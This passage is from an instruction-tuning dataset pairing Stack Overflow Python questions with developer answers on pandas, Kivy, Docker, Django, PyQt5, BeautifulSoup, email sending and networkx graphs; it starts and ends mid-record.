|\n|----|-------------------------|------|---------------------|-------------------------|------|-------------------|\n| 0  | 2013-01-01 09:31:23.999 | 0.0  | 1                   | 2013-01-01 09:31:24.999 | 2.0  | 2.0               |\n| 1  | 2013-01-01 09:31:24.200 | 1.0  | 1                   | 2013-01-01 09:31:25.200 | 8.0  | 7.0               |\n| 2  | 2013-01-01 09:31:24.250 | 2.0  | 1                   | 2013-01-01 09:31:25.250 | 8.0  | 6.0               |\n| 3  | 2013-01-01 09:31:25.000 | 8.0  | 1                   | 2013-01-01 09:31:26.000 | 8.0  | 0.0               |\n| 4  | 2013-01-01 09:31:25.375 | 6.0  | 1                   | 2013-01-01 09:31:26.375 | 6.0  | 0.0               |\n| 5  | 2013-01-01 09:31:25.850 | 1.0  | 1                   | 2013-01-01 09:31:26.850 | 3.0  | 2.0               |\n| 6  | 2013-01-01 09:31:26.100 | 3.0  | 1                   | 2013-01-01 09:31:27.100 | 3.0  | 0.0               |\n| 7  | 2013-01-01 09:31:27.150 | 10.0 | 1                   | 2013-01-01 09:31:28.150 | 10.0 | 0.0               |\n| 8  | 2013-01-01 09:31:28.050 | NaN  | 1                   | 2013-01-01 09:31:29.050 | 3.0  | NaN               |\n| 9  | 2013-01-01 09:31:28.850 | 3.0  | 1                   | 2013-01-01 09:31:29.850 | 6.0  | 3.0               |\n| 10 | 2013-01-01 09:31:29.200 | 6.0  | 1                   | 2013-01-01 09:31:30.200 | 6.0  | 0.0               |\n\n<\/code><\/pre>\n\n<p>More time efficient solutions are still welcome<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pandas dataframe conditional counting block by block<pre><code>np.random.seed(2020)\n\ndf = (pd.DataFrame(np.random.rand(20, 5), columns=['Block','A','B','C','D'])\n        .sort_values('Block'))\ndf['Block'] = df['Block'].mul(10).astype(int)\ndf.iloc[:, 1:] -= 0.7\nprint (df)\n    Block         A         B         C         D\n17      0  0.171687  0.202407 -0.250796 -0.081818\n13      0  0.194283  0.131532  0.037843  0.198497\n11      0 -0.135680  0.236032  0.103028 -0.002695\n2       1  0.057080  0.036325 -0.344337 -0.358907\n9       1 -0.063106 -0.144304 -0.508071 -0.274344\n6       1  0.196258 -0.326606 -0.320307  0.158317\n1       2 -0.423523 -0.356684  0.162159 -0.543300\n14      2 -0.520039 -0.085842 -0.683331 -0.400678\n19      2  0.232328 -0.286770 -0.539322 -0.231197\n8       4  0.131468  0.063921  0.219691 -0.629427\n12      4 -0.037565  0.049666 -0.168545 -0.217190\n10      5 -0.430622 -0.100980 -0.479826 -0.399138\n16      5 -0.522721  0.294459 -0.582625  0.140845\n7       6 -0.116538 -0.031650 -0.522207  0.149248\n3       6 -0.482899 -0.138573 -0.575821 -0.380264\n5       6 -0.665809 -0.243881 -0.544149 -0.223951\n15      6  0.252552  0.116207 -0.622138 -0.565387\n4       9 -0.562643 -0.130587  0.275665 -0.196633\n18      9 -0.302722 -0.252769 -0.466740  0.231729\n0       9  0.173392 -0.190254 -0.428164 -0.363081\n<\/code><\/pre>\n\n<p>I want to count the total number of cells which's value >0  grouped by the \"block\" Columns.<\/p>","output_text":"<p>Convert column <code>Block<\/code> to index by <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.set_index.html\" rel=\"nofollow noreferrer\"><code>DataFrame.set_index<\/code><\/a>, compare by <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.gt.html\" rel=\"nofollow noreferrer\"><code>DataFrame.gt<\/code><\/a> for greater like <code>0<\/code>, convert to integers and last use <code>sum<\/code> per index:<\/p>\n\n<pre><code>df1 = df.set_index('Block').gt(0).astype('int').sum(level=0)\nprint (df1)\n       A  B  C  D\nBlock            \n0      2  3  2  1\n1      2  1  0  1\n2      1  0  1  0\n4      1  2  1  0\n5      0  1  0  1\n6      1  1  0  1\n9      1  0  1  1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n pandas value_count() is showing different values every time I restart the notebook<p>Every time that I restart my <code>jupyter-lab<\/code> notebook, <code>value_count()<\/code> is showing different values.<\/p>\n<pre><code>bid = customers['BasketID']\nbid.value_counts()\n<\/code><\/pre>\n<p>Here's the results of two executions:<\/p>\n<pre><code>576339     542\n573585     535\n579196     533\n580727     529\n578270     442\n          ... \n563453       1\nC567706      1\n548001       1\nC546895      1\n574519       1\nName: BasketID, Length: 24627, dtype: int64\n\n\n\n576339     542\n573585     535\n579196     533\n580727     529\n578270     442\n          ... \nC562808      1\n575205       1\n549004       1\nC542991      1\n565577       1\nName: BasketID, Length: 24627, dtype: int64\n<\/code><\/pre>\n<p>As you can see there are always different numbers starting with a letter.<\/p>\n<p>Since in the notebook I have to reference one of these numbers, I can't have it changing at every iteration.<\/p>\n<p>Is there a way to make the method's output deterministic?<\/p>\n<p>I guess that this weird behaviour is due to the sorting algorithm used by the method. Maybe there is a way to see\/set the seed for the random number generator used by the algorithm?<\/p>","output_text":"<p><code>value_counts<\/code> by default has <code>sort=True<\/code>, which most likely uses quicksort to sort. You can try to disable that with <code>sort=False<\/code>, which returns the series with sorted index:<\/p>\n<pre><code>bid.value_counts(sort=False)\n<\/code><\/pre>\n<p>If you still want the sorted series, you can sort manually with <code>sort_values<\/code> and use the stable <code>mergesort<\/code> method:<\/p>\n<pre><code>bid.value_counts(sort=False).sort_values(ascending=False, kind='mergesort')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using Healpy to make star chart<p>I'm using healpy to plot the locations of galaxies on the sky from a list of RAs and Decs. So far, I think I've been able to correctly plot the galaxies, but I'd like to improve the finished product. Is there any way to bin the number of galaxies that appear in each healpy tile, rather than just coloring being based on whether there is or isn't a catalog member in the tile?<\/p>\n<p>Here I show the image that I'm currently making \u2014<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/FrQU9.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/FrQU9.png\" alt=\"image of the skymap\" \/><\/a><\/p>\n<p>right now it's only really useful for telling you where the Milky Way isn't. Here's the code I'm using.<\/p>\n<pre><code>phis = [np.deg2rad(ra) for ra in ra_list]\nthetas = [np.pi \/ 2 - np.deg2rad(dec) for dec in dec_list]\n\npixel_indices = hp.ang2pix(NSIDE, thetas, phis)\n\nm = np.zeros(hp.nside2npix(NSIDE))\nm[pixel_indices] = np.ones(num_galaxies_to_plot)\n\n\nhp.mollview(m, title = 'Sky Locations of GLADE Galaxies', cbar = False, rot=(180, 0, 180), cmap = 'binary')\nhp.graticule()\n<\/code><\/pre>","output_text":"<p>You could use <a href=\"https:\/\/numpy.org\/doc\/stable\/reference\/generated\/numpy.bincount.html\" rel=\"nofollow noreferrer\"><code>numpy.bincount<\/code><\/a> to create an array of the number of galaxies per pixels and then create a map of that.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use drop down widget in kivy<p>I am trying to add dropdown button to widget, but it show me only the button, without labels or textinput. After close APP it show me second widget with all stuff. \nWhere am i making a mistake? \nWell thank you<\/p>\n\n<p>My noob code:<\/p>\n\n<p>main.py:<\/p>\n\n<pre><code>class MyGrid(FloatLayout):\n    name = ObjectProperty(None)\n    email = ObjectProperty(None)\n    psc = ObjectProperty(None)\n\n\ndef btn(self):\n    self.clear_btn()\n\ndef clear_btn(self):\n    self.email.text = \"\"\n\nclass MyApp(App): # &lt;- Main Class\n    def build(self):\n        return MyGrid()\n\n\nif __name__ == \"__main__\":\n    MyApp().run()\n\ndropdown = DropDown()\nfor index in range(10):\n\n    btn = Button(text='Value %d' % index, size_hint_y=None, height=44)\n\n    btn.bind(on_release=lambda btn: dropdown.select(btn.text))\n\n    dropdown.add_widget(btn)\n\n\nmainbutton = Button(text='Hello', size_hint=(None, None))\n\nmainbutton.bind(on_release=dropdown.open)\n\ndropdown.bind(on_select=lambda instance, x: setattr(mainbutton, 'text', x))\n\nrunTouchApp(mainbutton)\n<\/code><\/pre>\n\n<p>my kv.file:<\/p>\n\n<pre><code>&lt;MyGrid&gt;:\n    Label:\n        text: \"Email: \"\n\n    TextInput:\n        id: email\n        multiline:False\n\n\n    Button:\n        size_hint: 0.3, 0.1\n        pos_hint: {\"x\":0.5, \"top\":0.11}\n        text:\"Send\"\n        on_press: root.btn()\n<\/code><\/pre>","output_text":"<p>Your problem is that the code:<\/p>\n\n<pre><code>if __name__ == \"__main__\":\n    MyApp().run()\n<\/code><\/pre>\n\n<p>runs your <code>MyApp<\/code>, and that does not return until <code>MyApp<\/code> closes. So the code after that does not get run until <code>MyApp<\/code> closes, and then<\/p>\n\n<pre><code>runTouchApp(mainbutton)\n<\/code><\/pre>\n\n<p>starts another <code>App<\/code>. You probably want the code that creates the <code>DropDown<\/code> inside a class somewhere (maybe <code>MyGrid<\/code>), and add the <code>mainbutton<\/code> to the gui (maybe in <code>MyGrid<\/code>).<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Solving coupled PDE with python<p>I do not understand how to solve for the eta and V in my coupled PDE equations using python or a python ode solver. (Or is it possible to do a numerical solution for these couple equations without a solver?)\n I have spent several days on this but I still cannot understand how to start!  Any hints would be helpful .  I understand the example given in <\/p>\n\n<p><a href=\"https:\/\/stackoverflow.com\/questions\/41220940\/solve-4-coupled-differential-equations-in-matlab\">Solve 4 coupled differential equations in MATLAB<\/a><\/p>\n\n<p>but I still need more hints to figure out how to apply these principles to my coupled PDEs below. <\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/5Pbs2.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/5Pbs2.png\" alt=\"coupled PDEs\"><\/a><\/p>\n\n<p>I would like to plot a timeseries of eta and V, given forcing inputs of varying timeseries of tau. <\/p>\n\n<p>x is a point in space, and t is a point in time.  h and f are assigned based on their value of x.<br>\nV = V(x,t)   eta = eta(x,t)  tau = tau(x,t)  h = h(x), f = f(x)   while g and rho are constants.  The boundary values are V(0,0) = 0, eta(0,0)=0 , and tau(0,0) = 0. Assuming steady state conditions, the solution (V) is found by equating tau_sy and tau_by. <\/p>","output_text":"<p>Ok, so here is a somewhat simple numerical scheme, that shows conceptual properties of your system. It is analogous to (explicit) Euler's method. It can be easily generalized to an analogous implicit Euler-like method. <\/p>\n\n<p>You are given:<\/p>\n\n<p>The functions <code>h(x)<\/code>, <code>f(x)<\/code> , <code>tau_sx(x, t)<\/code>, <code>tau_sy(x, t)<\/code> and <code>tau_by(x, t)<\/code><\/p>\n\n<p>The constants <code>g<\/code> and <code>rho<\/code><\/p>\n\n<p>You are looking for :<\/p>\n\n<p>The functions <code>V(x, t)<\/code> and <code>eta(x, t)<\/code> that satisfy the pair of differential equations above. <\/p>\n\n<p>To be able to find solutions to this problem, you need to be given:<\/p>\n\n<p><code>V(x, 0) = V0(x)<\/code> and <code>eta(0, t) = eta0(t)<\/code><\/p>\n\n<p>Assume your domain is <code>[0, L] X [0, T]<\/code>, where <code>x<\/code> in <code>[0, L]<\/code> and <code>t<\/code> in <code>[0, T]<\/code>. Discretize the domain as follows: choose <code>M<\/code> and <code>N<\/code> positive integers and let <code>dx = L \/ M<\/code> and <code>dt = T \/ N<\/code>. Then consider only the finite set of points <code>x = m dx<\/code> and <code>t = n dt<\/code> for any integers <code>m = 0, 1, ..., M<\/code> and <code>n = 0, 1, ..., N<\/code>. <\/p>\n\n<p>I am going to restrict all functions on the finite set of points defined above and use the following notation for an arbitrary function <code>funct<\/code>:<\/p>\n\n<p><code>funct(x, t) = funct[m, n]<\/code> and <code>funct(x) = funct[m]<\/code> for any  <code>x = m dx<\/code> and <code>t = n dt<\/code>.<\/p>\n\n<p>Then, the system of differential equations can be discretized as <\/p>\n\n<p><code>g*(h[m] + eta[m,n])*(eta[m+1, n] - eta[m,n])\/dx = f[m]*(h[m] + eta[m,n])*V[m,n] + tau_sx[m,n]\/rho<\/code><\/p>\n\n<p><code>(V[m, n+1] - V[m,n])\/dt = (tau_sy[m,n] - tau_by[m,n])\/(rho*(h[m] + eta[m,n]))<\/code><\/p>\n\n<p>Solve for <code>eta[m+1,n]<\/code> and <code>V[m,n+1]<\/code> <\/p>\n\n<p><code>eta[m+1,n] = eta[m,n] + f[m]*V[m,n]*dx\/g + tau_sx[m,n]*dx\/(g*rho*(h[m] + eta[m,n]))<\/code><\/p>\n\n<p><code>V[m,n+1] = V[m,n] + (tau_sy[m,n] - tau_by[m,n])*dt\/(rho*(h[m] + eta[m,n]))<\/code><\/p>\n\n<p>For simplicity, I am going to abbreviate the right hand sides of the equations above as<\/p>\n\n<p><code>eta[m+1,n] = F_eta(m, n, eta[m,n], V[m,n])<\/code><\/p>\n\n<p><code>V[m,n+1] = F_V(m, n, eta[m,n], V[m,n])<\/code><\/p>\n\n<p>that is, something like<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>def F_eta(m, n, eta[m,n], V[m,n]):\n    return eta[m,n] + f[m]*V[m,n]*dx\/g + tau_sx[m,n]*dx\/(g*rho*(h[m] + eta[m,n]))\n\ndef F_V(m, n,  eta[m,n], V[m,n]):\n    return V[m,n] + (tau_sy[m,n] - tau_by[m,n])*dt\/(rho*(h[m] + eta[m,n]))\n<\/code><\/pre>\n\n<p>From the boundary conditions, we know <\/p>\n\n<p><code>eta[0,n] = eta0[n] = eta0(n*dt)<\/code> and <\/p>\n\n<p><code>V[m,0] = V0[m] = V0(m*dx)<\/code><\/p>\n\n<p>as input, for <code>m = 0,..., M<\/code> and <code>n = 0,..., N<\/code>. <\/p>\n\n<pre><code>for n in range(N):\n    for m in range(M):\n        eta[m+1,n] = F_eta(m, n, eta[m,n], V[m,n])\n        V[m,n+1] = F_V(m, n, eta[m,n], V[m,n])\n<\/code><\/pre>\n\n<p>(you have to tweak these loops to reach the rightmost and the upper boundary points, but the philosophy stays the same)<\/p>\n\n<p>Basically, you follow the pattern: generate the etas along the horizontal x axis and at the same time you generate a V one layer up. Then you move up to the next horizontal level.<\/p>\n\n<pre><code>o --eta--&gt; o --eta--&gt; o --eta--&gt; o --eta--&gt; o\n|          |          |          |          | \nV          V          V          V          V\n|          |          |          |          |\no --eta--&gt; o --eta--&gt; o --eta--&gt; o --eta--&gt; o \n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Which is the correct way to load json file using Python and Docker?<p>I'm trying to import the content of a .json file and run it in a Docker container, but I get next error when run the docker container:<\/p>\n<p><strong>Error:<\/strong><\/p>\n<pre><code>Traceback (most recent call last):\nFile &quot;\/stockalert-app\/.\/app\/main.py&quot;, line 22, in &lt;module&gt;\n  main()\nFile &quot;\/stockalert-app\/.\/app\/main.py&quot;, line 17, in main\n  data = importData('data.json')\nFile &quot;\/stockalert-app\/.\/app\/main.py&quot;, line 10, in importData\n  with open(fileName) as json_file:\nFileNotFoundError: [Errno 2] No such file or directory: 'data.json'\n<\/code><\/pre>\n<p><strong>This is my project structure:<\/strong><\/p>\n<pre><code>\u251c\u2500\u2500 stockalert\n    \u251c\u2500\u2500 app\n    \u2502   \u251c\u2500\u2500 main.py\n    \u2502   \u251c\u2500\u2500 data.json\n    \u251c\u2500\u2500 requirements.txt\n    \u251c\u2500\u2500 Dockerfile\n<\/code><\/pre>\n<p><strong>main.py<\/strong><\/p>\n<pre><code>import json\n\ndef importData(fileName):\n    with open(fileName) as json_file:\n        data = json.load(json_file)    \n    return data\n\n\ndef main():\n    data = importData('data.json')\n    print(&quot;Data: &quot;)\n    print(data)\n\nif __name__ == &quot;__main__&quot;:\n    main()\n<\/code><\/pre>\n<p><strong>Dockerfile<\/strong><\/p>\n<pre><code>FROM python:3\n\nWORKDIR \/stockalert-app\n\nCOPY requirements.txt requirements.txt\nRUN pip3 install -r requirements.txt\n\nCOPY .\/app .\/app\n\nCMD [ &quot;python&quot;, &quot;.\/app\/main.py&quot; ]\n<\/code><\/pre>\n<p>I understand that I\u00b4m doing something wrong but I don\u00b4t know that, the code runs well on the host machine, but when runs into a container not, so the question is: Which is the correct way to do it?.<\/p>","output_text":"<p>With this Dockerfile instruction <code>WORKDIR \/stockalert-app<\/code>, you're setting the working directory to <code>\/stockalert-app<\/code>. This means that when you copy the <code>app<\/code> directory, the absolute path to the json file will be <code>\/stockalert-app\/app\/data.json<\/code>.<\/p>\n<p>You have two solutions:<\/p>\n<ol>\n<li>Use <code>WORKDIR \/app<\/code><\/li>\n<li>Use <code>importData('\/app\/data.json')<\/code> (or even better, <code>importData('\/stockalert-app\/app\/data.json'<\/code>)<\/li>\n<\/ol>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django query content_type by name not content_type_id<p>I need to count some relations from my Flags model to my Post Model. Now I don't understand how to query for the Post model name at my query, I understand how to query for the content_type_id but not for the content_type (as a string). I got something like this on my mind:<\/p>\n<pre><code>Q(models.Q(('app_label', 'App'), ('model', 'Post')) \n<\/code><\/pre>\n<p>but I don't know how the Syntax has to look like at that point, can smb. help?<\/p>\n<p>example:<\/p>\n<pre><code>def post_list_most_bad_flags(request):\n    p_counter_query = Flags.objects.filter(content_type_id=12) # --&gt; Want to replace this with content_type instead if content_type_id\n    counter = p_counter_query.count()\n    print(counter)\n<\/code><\/pre>\n<p>Thanks in advance<\/p>","output_text":"<p>Given <code>Flags<\/code> has a <code>ForeignKey<\/code> (or <code>OneToOneField<\/code> to the <code>ContentType<\/code> model, you can filter with:<\/p>\n<pre><code>def post_list_most_bad_flags(request):\n    p_counter_query = Flags.objects.filter(\n        <b>content_type__app_label='App',\n        content_type__model='Post'<\/b>\n    )\n    counter = p_counter_query.count()\n    print(counter)<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why PYQT5 connecting multiple checkboxes does not work in a loop, but works by writing out everything manually<p>I am working on PyQT5 and I have the following list.<\/p>\n<pre><code>self.config_cbs = [self.gui.cb_config_0, \\\n                   self.gui.cb_config_1, \\\n                   self.gui.cb_config_2, \\\n                   self.gui.cb_config_3, \\\n                   self.gui.cb_config_4, \\\n                   self.gui.cb_config_5, \\\n                   self.gui.cb_config_6, \\\n                   self.gui.cb_config_7, \\\n                   self.gui.cb_config_8, \\\n                   self.gui.cb_config_9, \\\n                   self.gui.cb_config_10, \\\n                   self.gui.cb_config_11]\n<\/code><\/pre>\n<p>I want to connect all checkboxes to the same function.<\/p>\n<p>Does anyone know, why does this NOT work?<\/p>\n<pre><code>for i, cb in enumerate(self.config_cbs):\n      cb.stateChanged.connect(lambda: self.config_cb_state_changed(i))\n<\/code><\/pre>\n<p>But this does work:<\/p>\n<pre><code>self.gui.cb_config_0.stateChanged.connect(lambda: self.config_cb_state_changed(0))\nself.gui.cb_config_1.stateChanged.connect(lambda: self.config_cb_state_changed(1))\nself.gui.cb_config_2.stateChanged.connect(lambda: self.config_cb_state_changed(2))\n...\n<\/code><\/pre>\n<p>Aren't these two equivalent?<\/p>","output_text":"<p><del><strong>Solution 1<\/strong><\/del><\/p>\n<p>Can you try with this?<\/p>\n<pre><code>for i, cb in enumerate(self.config_cbs):\n    cb.stateChanged.connect(lambda i=i: self.config_cb_state_changed(i))\n<\/code><\/pre>\n<p><strong>Solution 2<\/strong><\/p>\n<p>If it still does not work, you can still alter your function <code>config_cb_state_changed()<\/code> and identify the checkbox which triggered the signal with <code>self.sender()<\/code> (I assume all the code is part of the same class).<\/p>\n<pre><code>...\nfor cb in self.config_cbs:\n    cb.stateChanged.connect(self.config_cb_state_changed)\n...\n\ndef config_cb_state_changed(state: bool):\n    cb = self.sender()\n    # If needed, you can find your index i\n    i = self.config_cbs.index(cb)\n    # And just to be sure...\n    assert isinstance(cb, QCheckBox)\n    assert cb.isChecked() == state\n<\/code><\/pre>\n<p><strong>Solution 1 edited<\/strong><\/p>\n<pre><code>for i, cb in enumerate(self.config_cbs):\n    cb.stateChanged.connect(lambda state, i=i: self.config_cb_state_changed(i))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n beautiful soup TypeError: 'bytes' object is not callable<p><strong>My code<\/strong><\/p>\n<pre><code>page = requests.get(URL).content()\nsoup = BeautifulSoup(page,&quot;html.parser&quot;)\nprices = soup.find(&quot;span&quot;, class_=&quot;value hidden-xs&quot;).encode\nfor row in prices('div',\n                        attrs = {'class':'col-md-6 col-xs-12'}):\n    price = {}\n\n    price['url'] = row.span['data-value']\n\n    prices.append(price)\nprint(prices)\n<\/code><\/pre>\n<p><strong>The output:<\/strong><\/p>\n<pre><code>line 6, in &lt;module&gt;\n    page = requests.get(URL).content()\nTypeError: 'bytes' object is not callable\n<\/code><\/pre>\n<p>This is my first project with python and beautiful soup so I will be thankful if you explain what is wrong with it\nI did try the solution in <a href=\"https:\/\/stackoverflow.com\/questions\/27499836\/typeerror-bytes-object-is-not-callable\">typeerror 'bytes' object is not callable<\/a> but I think it doesn't work for python 3<\/p>\n<p>and when I tried it without <code>.content<\/code> it gives:<\/p>\n<pre><code>TypeError: object of type 'Response' has no len()\n<\/code><\/pre>\n<p><strong>When I run this code:<\/strong><\/p>\n<pre><code>page = requests.get(URL)\nsoup = BeautifulSoup(page,&quot;html.parser&quot;)\nprices = soup.find(&quot;span&quot;, class_=&quot;value hidden-xs&quot;).encode('utf-8')\nprint(prices)\n<\/code><\/pre>\n<p><strong>Outputs:<\/strong><\/p>\n<pre><code>b'&lt;span class=&quot;value hidden-xs&quot; data-value=&quot;1910.2&quot;&gt;\\xdb\\xb1\\xdb\\xb9\\xdb\\xb1\\xdb\\xb0.\\xdb\\xb2&lt;\/span&gt;'\n<\/code><\/pre>\n<p>I need to collect value of 9 of this &quot;data-value&quot;s and put them in an array<\/p>","output_text":"<pre><code>page = requests.get(URL)\n# ^^^^ this a response object\nsoup = BeautifulSoup(page,&quot;html.parser&quot;)\nprices = soup.find(&quot;span&quot;, class_=&quot;value hidden-xs&quot;).encode('utf-8')\nprint(prices)\n<\/code><\/pre>\n<p>When you're using <code>requests.get<\/code> function you are being returned a <code>Response<\/code> object. Response object has various attributes like status code, headers, url and <code>text<\/code> or <code>content<\/code> attribute which contains document data in either string (text) or bytes (content).<\/p>\n<p>In your example you should use:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>response = requests.get(URL)\nsoup = BeautifulSoup(response.text,&quot;html.parser&quot;)\nprices = soup.find(&quot;span&quot;, class_=&quot;value hidden-xs&quot;).encode('utf-8')\nprint(prices)\n<\/code><\/pre>\n<p>For full introduction to using BeautifulSoup in Python see my blog article <a href=\"https:\/\/scrapfly.io\/blog\/web-scraping-with-python-beautifulsoup\/\" rel=\"nofollow noreferrer\">Web Scraping with Python and BeautifulSoup<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to send an \"array\" with e-mail via python?<p>I want to send a mail with gmail. But mail <strong>must<\/strong> specifically include an <strong>array<\/strong>. I need help.\nMessage part in the code block, specifically accept text type. <\/p>\n\n<p>If I tell specifically my goal; I have a <strong>.csv<\/strong> file, and I'm creating random Sub Sample from this file. Sub Sample includes 5 rows. I created an array with this random rows and I want to send this random rows which type is array. <\/p>\n\n<pre><code>import pandas as pd\nimport smtplib\n\ndata = pd.read_csv(\"Words1.csv\")\nrow1 = data.sample(n=5)\nA = [row1]\nprint(A)\nemail = 'sender@gmail.com'  # Your email\npassword = 'senderpassword'  # Your email account password\nsend_to_email = 'receiver@gmail.com'  # Who you are sending the message to\nmessage = 'A'  # The message in the email \n\nserver = smtplib.SMTP('smtp.gmail.com', 587)  # Connect to the server\nserver.starttls()  # Use TLS\nserver.login(email, password)  # Login to the email server\nserver.sendmail(email, send_to_email, message)  # Send the email\nserver.quit()  # Logout of the email server\n<\/code><\/pre>\n\n<p>Thank you. <\/p>","output_text":"<p>Solution; <\/p>\n\n<pre><code>import numpy as np\nimport pandas as pd\nimport smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\ndata = pd.read_csv(\"Words.csv\")\nrow1 = data.sample(n=5)\nA = [row1]\nnum = np.array(row1)\n\nhead = ['C1', 'C2', 'C3']\nrow = ['1','2','3','4','5']\ndf = pd.DataFrame(num, index=row, columns=head)\nhtml = df.to_html()\nprint(html)\n\ndef py_mail(SUBJECT, BODY, TO, FROM):\n    \"\"\"With this function we send out our html email\"\"\"\n\n    MESSAGE = MIMEMultipart('alternative')\n    MESSAGE['subject'] = SUBJECT\n    MESSAGE['To'] = TO\n    MESSAGE['From'] = FROM\n\n    HTML_BODY = MIMEText(BODY, 'html')\n    MESSAGE.attach(HTML_BODY)\n\n\n    password = \"@YourPassword\"\n    server = smtplib.SMTP('smtp.gmail.com:587')\n    server.starttls()\n    server.login(FROM,password)\n    server.sendmail(FROM, [TO], MESSAGE.as_string())\n    server.quit()\n\nif __name__ == \"__main__\":\n    \"\"\"Executes if the script is run as main script (for testing purposes)\"\"\"\n\n    email_content = html\n\n    TO = 'to@gmail.com'\n    FROM ='from@gmail.com'\n\n    py_mail(\"Test email subject\", email_content, TO, FROM)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how to visualize network graph using python and pandas?<p>I have the below dataframe that includes <strong>file number<\/strong> field and <strong>departements<\/strong>\nwhere  each file number is assign to one or more departments and the number <strong>(1-0-99)<\/strong> represent the status of the file like<\/p>\n<ul>\n<li>1: mean the task is done<\/li>\n<li>0: the task is pending<\/li>\n<li>99: the department has no access to the file<\/li>\n<\/ul>\n<pre><code>    df=pd.DataFrame({'file':[1205,2897,1171,1322,4312,2211,1242,52,443,111],\n                     'finance':[1,99,0,0,1,99,1,0,1,99],\n                     'IT':[1,99,0,1,99,1,0,0,99,0],\n                     'marketing':[1,1,0,99,1,99,1,1,0,1]})\n<\/code><\/pre>\n<pre><code>            file    finance      IT     marketing  \n    0      1205       1          1        1     \n    1      2897       99         99       1     \n    2      1171       0          0        0    \n    3      1322       0          1        99   \n    4      4312       1          99       1     \n    5      2211       99         1        99    \n    6      1242       1          0        1    \n    7      52         0          0        1    \n    8      443        1          99       0    \n    9      111        99         0        1 \n<\/code><\/pre>\n<p>what i am asking is it possible to visualize the network of these files and departments using <strong>network graph<\/strong>??<\/p>\n<p>where the expected result is :<\/p>\n<ul>\n<li><strong>node 1 file number 1205  is connected to the three department and all the required tasks are done<\/strong><\/li>\n<li><strong>node 2 file number 2897 is connected to marketing dept<\/strong><\/li>\n<li><strong>node 3 file number 1171 is connected to the three department but the tasks still pending.<\/strong><\/li>\n<\/ul>","output_text":"<p>IIUC, you can use:<\/p>\n<pre><code>import pandas as pd\nimport networkx as nx\nimport matplotlib.pyplot as plt\n\n# df = pd.DataFrame(...)\n\nCOLORS = {0: 'red', 1: 'green'}\n\nedges = df.melt('file', var_name='department', value_name='status').query('status != 99')\nG = nx.from_pandas_edgelist(edges, source='department', target='file', edge_attr=['status'])\n\npos = nx.shell_layout(G, [edges['department'].unique(), edges['file'].unique()])\nnode_colors = ['lightcoral' if node in edges['department'].unique() else 'yellow' for node in G.nodes]\nedge_colors = [COLORS[G.edges[edge]['status']] for edge in G.edges]\n\nnx.draw_networkx(G, pos=pos, with_labels=True, node_color=node_colors, edge_color=edge_colors)\nplt.show()\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/4oZWh.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/4oZWh.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<pre><code>&gt;&gt;&gt; edges\n    file department  status\n0   1205    finance       1\n2   1171    finance       0\n3   1322    finance       0\n4   4312    finance       1\n6   1242    finance       1\n7     52    finance       0\n8    443    finance       1\n10  1205         IT       1\n12  1171         IT       0\n13  1322         IT       1\n15  2211         IT       1\n16  1242         IT       0\n17    52         IT       0\n19   111         IT       0\n20  1205  marketing       1\n21  2897  marketing       1\n22  1171  marketing       0\n24  4312  marketing       1\n26  1242  marketing       1\n27    52  marketing       1\n28   443  marketing       0\n29   111  marketing       1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Inline Comments ruamel.yaml<p>I am using <code>ruamel.yaml<\/code> to add comments to my auto-config generation functionality for my personal project. Coming to the question, I am going to do this with a similar example to make it explicit.<\/p>\n<hr \/>\n<p>Say, you have a default config dictionary (auto-generated):<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>{'auth': {'api_key': '', 'api_secret': ''}}\n<\/code><\/pre>\n<p>Now I load this dict into a <code>CommentedMap<\/code> object in the following way:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>yaml_config = yaml.round_trip_load(yaml.round_trip_dump(dump))\n<\/code><\/pre>\n<p>Now, I have a metadata dict that includes multiline\/single-line descriptions of these config values in the dict:<\/p>\n<pre class=\"lang-json prettyprint-override\"><code>{\n  &quot;auth&quot;: {\n    &quot;api_key&quot;: &quot;Think of this as the user name that represents your account when using the app.\\n# Head over to 